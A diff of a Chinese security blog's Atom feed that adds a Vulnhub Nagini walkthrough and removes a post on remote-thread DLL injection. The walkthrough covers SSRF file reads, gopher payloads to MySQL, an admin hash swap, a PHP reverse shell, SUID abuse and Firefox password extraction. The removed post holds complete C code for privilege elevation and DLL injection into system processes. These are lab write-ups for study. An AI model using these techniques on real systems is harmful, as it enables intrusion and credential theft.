@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-06-10T12:30:30.039Z</updated>
+  <updated>2021-06-14T18:07:23.007Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Vulnhub HarryPotter:Nagini</title>
+    <link href="http://422926799.github.io/posts/a52d611e.html"/>
+    <id>http://422926799.github.io/posts/a52d611e.html</id>
+    <published>2021-06-14T15:53:34.000Z</published>
+    <updated>2021-06-14T18:07:23.007Z</updated>
+    
+    <content type="html"><![CDATA[<p>vulnhub链接：<a href="http://www.vulnhub.com/entry/harrypotter-nagini,689/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap</p><pre><code>nmap -sV -A 192.168.93.225</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HE0Gd.png" alt=""></p><p>gobuster扫web</p><pre><code>gobuster dir -e -u http://192.168.93.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,rar,7z</code></pre><p><img src="https://z3.ax1x.com/2021/06/14/2HAxDf.png" alt=""></p><p>有个joomla CMS，进入后台就能通过模板getshell，除此之外还有个note.txt。访问如下<br><img src="https://z3.ax1x.com/2021/06/15/2HEXi4.png" alt=""></p><blockquote><p>提示用http3访问quic.nagini.hogwarts，将域添加进/etc/hosts</p></blockquote><p>得到提示的路径<br><img src="http://www.vxer.cn/zb_users/upload/2021/05/202105071620395007860213.png" alt="vxer.cn的图"></p><p>访问internalResourceFeTcher.php，存在SSRF漏洞<br>读取internalResourceFeTcher.php源码</p><pre><code>file:///var/www/html/internalResourceFeTcher.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVidO.png" alt=""> </p><p>读取/etc/passwd<br><img src="https://z3.ax1x.com/2021/06/15/2HVVWd.png" alt=""></p><p>读取joomla CMS数据库配置文件</p><pre><code>file:///var/www/html/joomla/configuration.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVuOP.png" alt=""></p><p>可以发现mysql没使用密码进行登录，意味着可以用ssrf访问mysql<br>》MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>利用gopherus.py生成gopher payload<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><p><img src="https://z3.ax1x.com/2021/06/15/2HV2Ox.png" alt=""></p><blockquote><p>注意:然后我们必须使用浏览器的 url 访问该站点。（curl 在这里不起作用。）如果没有显示内容，只需刷新页面几次。<br><img src="https://z3.ax1x.com/2021/06/15/2HVWm6.png" alt=""></p></blockquote><p>数据库版本<br><img src="https://z3.ax1x.com/2021/06/15/2HVwwT.png" alt=""></p><p>查看joomla数据库所有表<br><img src="https://z3.ax1x.com/2021/06/15/2HZkn0.png" alt=""></p><p>读取joomla_users<br><img src="https://z3.ax1x.com/2021/06/15/2HZABV.png" alt=""></p><p>查看后发现hash无法破解，直接将md5替换掉site_admin的用户然后在登录即可<br><img src="https://z3.ax1x.com/2021/06/15/2HZeNF.png" alt=""></p><p>登录后台<br>joomla/administrator<br><img src="https://z3.ax1x.com/2021/06/15/2HZu9J.png" alt=""></p><p>找到模板处写shell<br>(尝试phpinfo)<br><img src="https://z3.ax1x.com/2021/06/15/2HZK39.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HZQj1.png" alt=""></p><p>php_reverse_shell<br><img src="https://z3.ax1x.com/2021/06/15/2HZwjI.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>home目录下有两个用户snape,hermoine<br><img src="https://z3.ax1x.com/2021/06/15/2HZDDP.png" alt=""></p><p>在/home/snape目录下找到hermoine用户的ssh密码<br><img src="https://z3.ax1x.com/2021/06/15/2HuYqI.png" alt=""></p><p>登录后利用发现的SUID cp文件，将ssh公钥拷贝到/home/hermoine/.ssh/authorized_keys<br><img src="https://z3.ax1x.com/2021/06/15/2HuNZt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuUdP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuaIf.png" alt=""></p><p>实现私钥登录hermoine用户<br><img src="https://z3.ax1x.com/2021/06/15/2Huwi8.png" alt=""></p><p>用户目录下存在firefox的数据，scp下载到本地解密得到root密码<br><a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0" target="_blank" rel="noopener">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a><br><img src="https://z3.ax1x.com/2021/06/15/2Hu0JS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuBRg.png" alt=""></p><p>得到最后的flag<br><img src="https://z3.ax1x.com/2021/06/15/2HuDzQ.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.vxer.cn/?id=80" target="_blank" rel="noopener">http://www.vxer.cn/?id=80</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;vulnhub链接：&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-nagini,689/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harr</summary>
+      
+    
+    
+    
+    
+    <category term="靶场" scheme="http://422926799.github.io/tags/靶场/"/>
+    
+  </entry>
+  
+  <entry>
     <title>hacksudo fgo</title>
     <link href="http://422926799.github.io/posts/2f666841.html"/>
     <id>http://422926799.github.io/posts/2f666841.html</id>
     <published>2021-06-10T12:16:16.000Z</published>
-    <updated>2021-06-10T12:30:30.039Z</updated>
+    <updated>2021-06-10T12:30:42.215Z</updated>
     
     <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RY6O0.png" alt=""></p><p>开放了80、21、3306、22</p><p>路径扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RYRTU.png" alt=""></p><p>访问dict.txt得到一份字典，ftp爆破。得到正确密码<br><img src="https://z3.ax1x.com/2021/06/10/2RYXkD.png" alt=""></p><p>ftp登录上去，发现两个目录。东西全部下载下来<br><img src="https://z3.ax1x.com/2021/06/10/2RtAAS.png" alt=""></p><p>其中压缩包里wav后缀结尾的文件是凯撒加密，解密得到后台密码<br><img src="https://z3.ax1x.com/2021/06/10/2Rtm1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtUj1.png" alt=""></p><p>文件上传copy改名得到shell</p><p><img src="https://z3.ax1x.com/2021/06/10/2Rt69H.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtDAO.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/10/2RtggA.png" alt=""></p><p>发现SUID<br><img src="https://z3.ax1x.com/2021/06/10/2Rt5E8.png" alt=""></p><p>利用look读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/10/2RtzUU.png" alt=""></p><p>john破解hash<br><img src="https://z3.ax1x.com/2021/06/10/2RNC8J.png" alt=""></p><p>登录得到user.txt，发现该用户目录下存在二进制文件fog<br><img src="https://z3.ax1x.com/2021/06/10/2RNEb6.png" alt=""></p><p>经过IDA分析，发现是setuid(0)/setguid(0)后调用python，而属主是root。可利用其提权<br><img src="https://z3.ax1x.com/2021/06/10/2RNrq0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RNtIS.png" alt=""></p>]]></content>
     
@@ -435,28 +457,6 @@
     
     
     <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>远程线程注入(系统进程)</title>
-    <link href="http://422926799.github.io/posts/b76f927c.html"/>
-    <id>http://422926799.github.io/posts/b76f927c.html</id>
-    <published>2021-03-14T15:57:27.000Z</published>
-    <updated>2021-03-14T16:07:12.399Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>CreateRemoteThread</li></ul><p>特权开启：</p><ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p><pre><code class="C">bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}</code></pre><p>完整代码</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}int main(){        int pid = 1148;        EnbalePrivileges();        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;        int dllnamesize = strlen(dllname) * 2;        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);        if (pidmodule == NULL) {               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);        if (vaeAddr == NULL) {               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);        if (loadaddress == NULL) {               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);        if (runthread == NULL) {               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());        }        printf(&quot;CreateRemoteThread Sucess\n&quot;);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到&lt;br&gt;系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。&lt;br&gt;然后联想到是不是权限</summary>
-      
-    
-    
-    
-    
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
     
   </entry>
   
